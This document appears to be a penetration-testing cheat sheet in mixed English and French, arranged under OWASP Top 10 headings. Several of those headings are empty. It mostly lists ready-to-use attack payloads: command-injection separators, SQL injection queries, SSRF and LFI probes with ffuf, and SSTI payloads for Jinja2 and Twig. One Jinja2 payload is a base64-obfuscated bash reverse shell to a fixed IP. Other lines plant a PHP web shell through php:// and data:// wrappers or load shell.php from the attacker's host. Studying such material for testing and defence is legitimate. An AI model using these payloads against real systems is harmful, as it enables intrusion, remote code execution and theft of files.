# Top-10-OWASP-CHEATSHEET

  ## *Top 1./ Broken acces control*
  - IDOR (insecure direct object reference) just modify :
  ```bash
  #change parameters post, change id, try and see the response of server 200,404,302 
  http://example.com/user/"35" or http://example.com/user/file.php?image="4",...
  ```
  ## *Top 2./ Cryptographic failures*
  - poor Cryptographic implementation, deprecied or insecure algorithm
  - PNRG (Pseudo Random Génerator Number) sometime algorithm use to generate a random number for crypto is predictably (like random in python)
  - Algorithms of simetric encryption :
  ```test
  AES 128,192,256 bits (secure, industrie standard)
  RC6 (secure, but not a industrie standard)
  DES 56bits key too small
  3DES deprecied and replace by AES
  RC4 not secure but fast
  RC5 not secure but fast
  ```
  - Algorithms of asimetric encryption :
  ```test
  RSA 1024,2048,3072,4096bits (1024 not secure)
  Diffie hellman (only use for exchange key)
  ```
  - Algorithms of hashage :
  ```test
  MD2, MD4, MD5, MD6 (not secure depricied)
  SHA-1 (not secure depricied)
  SHA-2 (224,256,384,512) secure
  SHA-3 secure
  RIPEMD (128,160,256,320) secure use in bitcoin
  bcrypt: Variable-length hash, typically 22-34 characters long, with a salt value and a work factor (iterations).
  PBKDF2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
  Argon2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
  ```
  - Algorithms of HMAC :
  ```bash
  HS256, HS384 and HS512
  ```
  ## *Top 3./ Injection breach*
Before starting to try some payload you need to understand how web application work.   
You need to enumerate:
  - All users input
  - Url parameters
  - Variable like *GET*, *POST*, *COOKIES*
  - configuration files
  - Query parameters in URL script or application
  - View source code to know the version of OS, server SQL, server web.
  - 
Analyse every error message, its a good practise for what can you do and what can't you do 
  ### Command injection
Try this basic caracters and add command like `dir` or `cat /etc/passwd`.
```text
%09
${IFS}
;
%3b
\n
%0a
|
%7c
&
%26
&&
%26%26
||
%7c%7c
''
%60%60
$(...)
%24%28%29
`...`
'''
%60%60%60
```
You can find payloads of Windows and linux with file uploads of this repositorie
  ### XSS (Cross Site Scripting)
  ### SQL Injection  
  Check in input web, url, or in request parameter if webapplication use sql 
  ```SQL
  SELECT * from artcile where id = 1 ;--(e.g: SELECT column_name from table_name where filter = 1)
  ```
  BINARY SQL Injection, if message error is false also its a good request sql
  ```SQL
  SELECT * from artcile where id = '1' UNION SELECT 1,2,3 where database() like 'sq%';--
  ```
  SLEEP SQL Injection, if request sleep 1 sec also its a good request sql
  ```SQL
  SELECT * from artcile where id = '1' UNION SELECT sleep(1),2 from information_schema.columns where table_name = 'sqli_one' and table_name = 'users' and column_name = 'id';--
  ```
  ## *Top 4 non-secure application*
  ## *Top 5 bad configuration*
  ## *Top 6 composant vulnerability*
  ## *Top 7 authentification failure*
  ## *Top 8 failure integrity data*
  ## *Top 9 journalisation defect*
  ## *Top 10./ SSRF (Server-Side Request Forgery), SSTI (Server-Side Template Injection), SSI (Server-Side Includes)*
  **A chercher dans des boutons qui affichent directement un retour sans charger la page ou quand le site pense faire une requete vers une autre site**
### **SSRF**
Permet sur une application web (API) de faire une requete avec le server. (like preview button)
Une fois la faille SSRF découverte on peut tester de faire des requetes GEt ou POST comme :
```bash
example=http://127.0.0.1:<port>/
example=file:///etc/passwd
example=gopher://localhost/admin
```
utiliser FUFF pour le scan de port, ou scan d'endpoint 
```bash
ffuf -w nb.txt -u http://example.com/ -X POST -H "Content-type: application/x-www-form-urlencoded" -d "example=http://127.0.0.1:FUZZ/"
ffuf -w /usr/shar/wordlists/seclists/Discovery/Web-content/burp -u http://example.com/ -X POST -H "Content-type: application/x-www-form-urlencoded" -d "example=http://example.com/FUZZ.php"
```
-------------------------
### SSTI
Payload principal a tester pour connaître le moteur de template:  

![Capture d'écran de mon projet](diagram.png)
  
Lien utile :[SSTI Payloads +++](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)  
  
SSTI avec Jinja2 si {{7*'7'}}=777777:  
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat\x20/backend/requirements.txt').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('echo\x20"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OS80NDQ0IDA+JjEK"\x20|\x20base64\x20-d\x20|\x20bash').read()}}
```
SSTI avec TWIG si {{7*'7'}}=49:
```php
{{_self}}
{{"/etc/passwd"|file_excerpt(1,-1)}}
{{['id'] | filter('system')}}
```
## *Top 11./ LFI (Local File Inclusion) and RFI (Remote File Inclusion)*
**A chercher un peu partout dans les parametres GET et POST**
Test de payload pour la découverte d'une LFI:  
```bash
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://example.com/index.php?language=FUZZ
```
Bypass:
```bash
....//
..././
....\/
....////
#url encode sur burpsuite
./language/../../../
```
PHP filter  
```bash
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id #echo '<?php system($_GET["cmd"]); ?>' | base64 = PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```
RFI 
Dans le meme style qu'une faille SSRF
```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```




